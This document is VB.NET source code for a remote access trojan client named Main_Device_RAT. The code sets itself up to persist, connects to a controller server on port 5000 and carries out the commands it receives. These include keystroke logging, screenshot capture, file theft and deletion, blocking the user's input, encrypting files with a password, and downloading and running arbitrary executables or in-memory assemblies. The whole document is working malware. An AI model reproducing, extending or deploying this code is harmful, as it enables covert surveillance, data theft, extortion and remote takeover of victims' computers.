Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Threading.Tasks

Public Class Main_Device_RAT
    Public Reader As BinaryReader
    Public Writer As BinaryWriter
    Public Property IPAddress As IPEndPoint
    Public Property Thread As Threading.Thread
    Private Client As New TcpClient
    Public Sub Work()
Start:
        Try
            Dim Setfiles As New Set_Files
            Setfiles.SaveMe()
            Setfiles.Registry()
            If Client IsNot Nothing Then Client.Close()
            Reader = Nothing
            Writer = Nothing
            Client = New TcpClient
            Dim GetIP As New IP_Address
            Client.Connect(GetIP.IP.ToString, 5000)
            Reader = New BinaryReader(Client.GetStream)
            Writer = New BinaryWriter(Client.GetStream)
            Dim Command As String = ""
            Command = Reader.ReadString
            Select Case Command
                Case "BlockInput"
                    BlockInput(True)
                Case "UnblockInput"
                    BlockInput(False)
                Case "ShutdownComputer"
                    Shell("shutdown.exe -s")
                Case "RestartComputer"
                    Shell("shutdown.exe -r")
                Case "LogoffComputer"
                    Shell("shutdown.exe -l")
                Case "HibernateComputer"
                    Shell("shutdown.exe -h")
                Case "SendFileSize"
                    Try
                        Dim Size As Long = (New FileInfo(Reader.ReadString)).Length
                        Writer.Write(Size)
                    Catch ex As Exception
                        Dim NULLLENGTH As Long = 0
                        Writer.Write(NULLLENGTH)
                    End Try
                Case "GetClientInfo"
                    Writer.Write(Environment.MachineName)
                    Writer.Write(Environment.UserName)
                    Writer.Write(Process.GetCurrentProcess.ProcessName)
                    Writer.Flush()
                Case "UploadFilePart"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim Start As Long = Reader.ReadInt64
                        Dim Length As Long = Reader.ReadInt64
                        Dim Bytes() As Byte = Reader.ReadBytes(Length)
                        Using Stream As New FileStream(Path, FileMode.OpenOrCreate)
                            Stream.Position = Start
                            Stream.Write(Bytes, 0, Bytes.Length)
                        End Using
                    Catch ex As Exception
                    End Try
                Case "Send Drives"
                    Try
                        Dim Drives = IO.DriveInfo.GetDrives
                        Writer.Write(Drives.Length.ToString)
                        For Each Drive In Drives
                            Writer.Write(Drive.Name)
                        Next
                        Writer.Flush()
                    Catch ex As Exception
                        Writer.Write(0)
                    End Try
                Case "Upload Image"
                    Try
                        Dim Image = Set_Files.Captureit()
                        Dim Stream As IO.MemoryStream = New IO.MemoryStream
                        Image.Save(Stream, Drawing.Imaging.ImageFormat.Jpeg)
                        Dim GetBytes() As Byte
                        GetBytes = Stream.ToArray
                        Dim Compressed() As Byte = Set_Files.Compress(GetBytes)
                        Dim Bytes As Long = Compressed.Length
                        Writer.Write(Bytes)
                        Writer.Write(Compressed)
                        Writer.Flush()
                    Catch ex As Exception
                    End Try
                Case "Move Directory"
                    Try
                        Dim Dir1 As String = Reader.ReadString
                        Dim Dir2 As String = Reader.ReadString
                        Directory.Move(Dir1, Dir2)
                        Writer.Write(True)
                    Catch ex As Exception
                        Writer.Write(False)
                    End Try
                Case "DownloadFilePart"
                    Dim Path As String = Reader.ReadString
                    Dim Start As Long = Reader.ReadInt64
                    Dim Length As Long = Reader.ReadInt64
                    Try
                        Dim Bytes(Length - 1) As Byte
                        Using Stream As New FileStream(Path, FileMode.Open)
                            Stream.Position = Start
                            Stream.Read(Bytes, 0, Bytes.Length)
                        End Using
                        Writer.Write(Bytes)
                    Catch ex As Exception
                        Dim Empty(Length - 1) As Byte
                        Writer.Write(Empty)
                    End Try
                Case "Run Application"
                    Try
                        Dim FileAddress As String = ""
                        FileAddress = Reader.ReadString
                        Process.Start(FileAddress)
                    Catch ex As Exception
                    End Try
                Case "Stop Application"
                    Try
                        Dim FileName As String = ""
                        FileName = Reader.ReadString
                        For Each P As Process In Process.GetProcesses
                            If P.ProcessName = FileName Then
                                P.Kill()
                            End If
                        Next
                    Catch
                    End Try
                Case "Delete File"
                    Try
                        Dim FileAddress As String = ""
                        FileAddress = Reader.ReadString
                        If File.Exists(FileAddress) Then
                            File.Delete(FileAddress)
                        End If
                    Catch
                    End Try
                Case "GetProcesses"
                    Try
                        Dim Processes = Process.GetProcesses
                        Writer.Write(Processes.Length.ToString)
                        For Each Process In Processes
                            Try
                                Dim Name As String = Process.ProcessName
                                Dim Id As Long = Process.Id
                                Dim Proc As String = Name & ">" & Id
                                Writer.Write(Proc)
                                Writer.Flush()
                            Catch ex As Exception
                            End Try
                        Next
                        Writer.Flush()
                    Catch ex As Exception
                    End Try
                Case "Send Directories"
                    Try
                        Dim Directori As String = ""
                        Directori = Reader.ReadString
                        If Directory.Exists(Directori) Then
                            Dim directories = Directory.GetDirectories(Directori)
                            Writer.Write(directories.Length.ToString)
                            For Each direct In directories
                                Dim Directory As New IO.DirectoryInfo(direct)
                                Writer.Write(Directory.FullName & ">" & Directory.Name)
                            Next
                            Writer.Flush()
                        End If
                    Catch
                    End Try
                Case "Send Directories And Files"
                    Try
                        Dim Directori As String = ""
                        Directori = Reader.ReadString
                        If Directory.Exists(Directori) Then
                            Dim directories = Directory.GetDirectories(Directori)
                            Writer.Write(directories.Length.ToString)
                            For Each direct In directories
                                Dim Directory As New IO.DirectoryInfo(direct)
                                Writer.Write(Directory.FullName & ">" & Directory.Name)
                            Next
                            Dim Files = IO.Directory.GetFiles(Directori)
                            Writer.Write(Files.Length.ToString)
                            For Each Fil In Files
                                Dim File As New IO.FileInfo(Fil)
                                Writer.Write(File.FullName & ">" & File.Name)
                            Next
                            Writer.Flush()
                        End If
                    Catch
                    End Try
                Case "Delete Directory"
                    Try
                        Dim FileAddress As String = Reader.ReadString
                        Dim Directory As String = FileAddress
                        If IO.Directory.Exists(Directory) Then
                            IO.Directory.Delete(Directory)
                        End If
                    Catch ex As Exception
                    End Try
                Case "Create Directory"
                    Try
                        Dim FileAddress As String = Reader.ReadString
                        IO.Directory.CreateDirectory(FileAddress)
                    Catch ex As Exception
                    End Try
                Case "Send Fileinfo"
                    Try
                        Dim Fileaddress As String = Reader.ReadString
                        Dim Fil As New FileInfo(Fileaddress)
                        Writer.Write("FullName = " & Fil.FullName & "<" & "Size = " & Fil.Length.ToString & "<" & "Extension = " & Fil.Extension.ToString & "<" & "CreationTime = " & Fil.CreationTimeUtc.ToString & "<" & "LastWriteTime = " & Fil.LastWriteTimeUtc.ToString & "<" & "LastAccessTime =" & Fil.LastAccessTimeUtc.ToString & "<" & "Attributes = " & Fil.Attributes)
                        Writer.Flush()
                    Catch ex As Exception
                    End Try
                Case "Send Directoryinfo"
                    Dim Directoryaddress As String = Reader.ReadString
                    Dim Dir As New DirectoryInfo(Directoryaddress)
                    Writer.Write("FullName = " & Dir.FullName & "<" & "Extension = " & Dir.Extension.ToString & "<" & "CreationTime = " & Dir.CreationTimeUtc.ToString & "<" & "LastWriteTime = " & Dir.LastWriteTimeUtc.ToString & "<" & "LastAccessTime =" & Dir.LastAccessTimeUtc.ToString & "<" & "Attributes = " & Dir.Attributes)
                    Writer.Flush()
                Case "Encrypt File"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim Pass As String = Reader.ReadString
                        Dim Bytes() As Byte = IO.File.ReadAllBytes(Path)
                        Dim Encrypted() As Byte = Set_Files.encrypt(Bytes, Pass)
                        IO.File.WriteAllBytes(Path, Encrypted)
                        Writer.Write(True)
                    Catch
                        Writer.Write(False)
                    End Try
                Case "Decrypt File"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim Pass As String = Reader.ReadString
                        Dim Bytes() As Byte = IO.File.ReadAllBytes(Path)
                        Dim Decrypted() As Byte = Set_Files.Decrypt(Bytes, Pass)
                        IO.File.WriteAllBytes(Path, Decrypted)
                        Writer.Write(True)
                    Catch
                        Writer.Write(False)
                    End Try
                Case "Compress File"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim Bytes() As Byte = IO.File.ReadAllBytes(Path)
                        Dim Compressed() As Byte = Set_Files.Compress(Bytes)
                        IO.File.WriteAllBytes(Path, Compressed)
                        Writer.Write(True)
                    Catch
                        Writer.Write(False)
                    End Try
                Case "Decompress File"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim Bytes() As Byte = IO.File.ReadAllBytes(Path)
                        Dim Decompressed() As Byte = Set_Files.Decompress(Bytes)
                        IO.File.WriteAllBytes(Path, Decompressed)
                        Writer.Write(True)
                    Catch
                        Writer.Write(False)
                    End Try
                Case "SendLastKeys"
                    Try
                        Dim inputs As String
                        inputs = Main.inputs
                        If inputs = "" Then
                            Writer.Write("No Inputs")
                            Writer.Flush()
                        Else
                            Writer.Write(inputs)
                            Writer.Flush()
                            Main.inputs = ""
                        End If
                    Catch
                    End Try
                Case "Copy File"
                    Try
                        Dim OriginalPath As String = Reader.ReadString
                        Dim CopyingPath As String = Reader.ReadString
                        Dim FileInfo As New FileInfo(OriginalPath)
                        FileInfo.CopyTo(CopyingPath)
                        Writer.Write(True)
                    Catch
                        Writer.Write(False)
                    End Try
                Case "Move File"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim NewPath As String = Reader.ReadString
                        Dim FileInfo As New FileInfo(Path)
                        FileInfo.MoveTo(NewPath)
                        Writer.Write(True)
                    Catch
                        Writer.Write(False)
                    End Try
                Case "Set Attribute"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim Attribute As String = Reader.ReadString
                        Select Case Attribute
                            Case "Archive"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Archive)
                            Case "Compressed"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Compressed)
                            Case "Device"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Device)
                            Case "Directory"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Directory)
                            Case "Encrypted"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Encrypted)
                            Case "Hidden"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Hidden)
                            Case "Normal"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Normal)
                            Case "NotContentIndex"
                                IO.File.SetAttributes(Path, IO.FileAttributes.NotContentIndexed)
                            Case "Offline"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Offline)
                            Case "ReadOnly"
                                IO.File.SetAttributes(Path, IO.FileAttributes.ReadOnly)
                            Case "ReparsePoint"
                                IO.File.SetAttributes(Path, IO.FileAttributes.ReparsePoint)
                            Case "SparseFile"
                                IO.File.SetAttributes(Path, IO.FileAttributes.SparseFile)
                            Case "System"
                                IO.File.SetAttributes(Path, IO.FileAttributes.System)
                            Case "Temporary"
                                IO.File.SetAttributes(Path, IO.FileAttributes.Temporary)
                        End Select
                    Catch ex As Exception
                    End Try
                Case "Rename File"
                    Try
                        Dim Path As String = Reader.ReadString
                        Dim NewPath As String = Reader.ReadString
                        Dim FileInfo As New FileInfo(Path)
                        FileInfo.MoveTo(NewPath)
                        Writer.Write(True)
                    Catch
                        Writer.Write(False)
                    End Try
                Case "InvokeEXE"
                    Dim Size As Integer = Reader.ReadInt32
                    Dim Data() As Byte = Reader.ReadBytes(Size)
                    Try
                        Dim temp = Path.GetTempFileName + ".exe"
                        IO.File.WriteAllBytes(temp, Data)
                        Process.Start(temp)
                    Catch ex As Exception
                    End Try
                Case "InvokeAssembly"
                    Dim Size As Integer = Reader.ReadInt32
                    Dim Data() As Byte = Reader.ReadBytes(Size)
                    Try
                        Dim Assembly = Reflection.Assembly.Load(Data)

                        Dim EntryPoint = Assembly.EntryPoint
                        If EntryPoint IsNot Nothing Then
                            Dim t As New Threading.Thread(Sub()
                                                              EntryPoint.Invoke(Nothing, Nothing)
                                                          End Sub)
                            t.Start()
                        Else
                            Dim Types = Assembly.GetTypes
                            For Each Type In Types
                                If Type.Name = "Main" Then
                                    Try
                                        Dim Proc = Type.GetMethod("Main")
                                        If Proc Is Nothing Then Continue For
                                        Dim task As New Threading.Thread(Sub()
                                                                             Proc.Invoke(Nothing, Nothing)
                                                                         End Sub)
                                        task.Start()
                                    Catch ex As Exception
                                    End Try
                                End If
                            Next
                        End If
                    Catch ex As Exception
                    End Try
                Case "GetProcessInfo"
                    Dim Str As String = ""
                    Try
                        Dim P As Process = Process.GetProcessById(Val(Reader.ReadString))
                        Str = "Processname = " & P.ProcessName & "<" & "ProcessId = " & P.Id.ToString & "<" & "MachineName = " & P.MachineName & "<" & "Memroy = " & SizeString(P.WorkingSet64) & "<" & "StartTime = " & P.StartTime.ToString & "<" & "Path = " & ProcessPath(P)
                        Writer.Write(Str)
                        Writer.Flush()
                    Catch
                        Str = "Nothing"
                        Writer.Write(Str)
                        Writer.Flush()
                    End Try
                Case "DownloadFileFromWeb"
                    Dim File As String = Reader.ReadString
                    Dim Target As String = Reader.ReadString
                    Dim Thread As New Threading.Thread(Sub()
                                                           Try
                                                               My.Computer.Network.DownloadFile(File, Target, Nothing, Nothing, False, 5000, True)
                                                           Catch ex As Exception
                                                           End Try
                                                       End Sub)
                    Thread.Start()
                Case "UploadFileToWeb"
                    Dim File As String = Reader.ReadString
                    Dim Target As String = Reader.ReadString
                    Dim Thread As New Threading.Thread(Sub()
                                                           Try
                                                               My.Computer.Network.UploadFile(File, Target, Nothing, Nothing, False, 5000)
                                                           Catch ex As Exception
                                                           End Try
                                                       End Sub)
                    Thread.Start()
                Case "UPDownloadFileFromWeb"
                    Dim File As String = Reader.ReadString
                    Dim Target As String = Reader.ReadString
                    Dim Username As String = Reader.ReadString
                    Dim Password As String = Reader.ReadString
                    Dim Thread As New Threading.Thread(Sub()
                                                           Try
                                                               My.Computer.Network.DownloadFile(File, Target, Username, Password, False, 5000, True)
                                                           Catch ex As Exception
                                                           End Try
                                                       End Sub)
                    Thread.Start()
                Case "UPUploadFileToWeb"
                    Dim File As String = Reader.ReadString
                    Dim Target As String = Reader.ReadString
                    Dim Username As String = Reader.ReadString
                    Dim Password As String = Reader.ReadString
                    Dim Thread As New Threading.Thread(Sub()
                                                           Try
                                                               My.Computer.Network.UploadFile(File, Target, Username, Password, False, 5000)
                                                           Catch ex As Exception
                                                           End Try
                                                       End Sub)
                    Thread.Start()
                Case "Dispose"
                    Dim p As Process = Process.GetCurrentProcess
                    p.Kill()
            End Select
            GoTo Start
        Catch ex As Exception
            GoTo Start
        End Try
    End Sub
    <DllImport("user32.dll")>
    Private Shared Function BlockInput(ByVal fBlockIt As Boolean) As Boolean
    End Function
    Private Function SizeString(ByVal Size As Long) As String
        If Size < 1024 Then
            Return Size.ToString + " B"
        ElseIf Size < 1024 * 1024 Then
            Return Int(Size / 1024).ToString + " KB"
        ElseIf Size < 1024 * 1024 * 1024 Then
            Return Int(Size / 1024 / 1024).ToString + " MB"
        Else
            Return Int(Size / 1024 / 1024 / 1024).ToString + " GB"
        End If
    End Function
    Public Function ProcessPath(ByVal p As Process) As String
        Dim FileName As String = ""
        Try
            FileName = p.MainModule.FileName
        Catch ex As Exception
            FileName = ""
        End Try
        Return FileName
    End Function
End Class